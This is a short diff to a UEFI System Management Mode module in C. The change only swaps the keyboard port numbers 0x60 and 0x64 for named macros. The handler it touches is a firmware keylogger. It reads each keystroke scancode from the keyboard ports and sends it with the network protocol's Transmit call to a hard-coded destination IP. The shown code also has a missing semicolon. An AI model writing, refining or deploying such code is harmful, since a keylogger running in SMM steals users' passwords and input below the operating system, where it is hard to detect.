@@ -8,6 +8,9 @@
 #include <Protocol/LoadedImage.h>
 #include <Protocol/SimpleNetwork.h>
 
+#define keyboard_IO_port 0x60 // Keyboard data port
+#define keyboard_status_port 0x64 // Keyboard status port
+
 EFI_SMM_BASE2_PROTOCOL *SmmBase2;
 EFI_SMM_SYSTEM_TABLE2 *Smst;
 EFI_SIMPLE_NETWORK_PROTOCOL *Snp;
@@ -26,11 +29,11 @@ EFI_STATUS EFIAPI KeyboardSmiHandler (
     DestIp.Addr[3] = 1;
 
     // Read the keyboard status
-    UINT8 status = IoRead8(0x64); // Keyboard status port
+    UINT8 status = IoRead8(keyboard_status_port); 
 
     // Check if there is data available
     if (status & 0x01) {
-        UINT8 keycode = IoRead8(0x60); // Keyboard data port
+        UINT8 keycode = IoRead8(keyboard_IO_port); 
         Snp->Transmit(Snp, 0, sizeof(keycode), &keycode, &DestIp, NULL, 0);
         return EFI_SUCCESS
     }
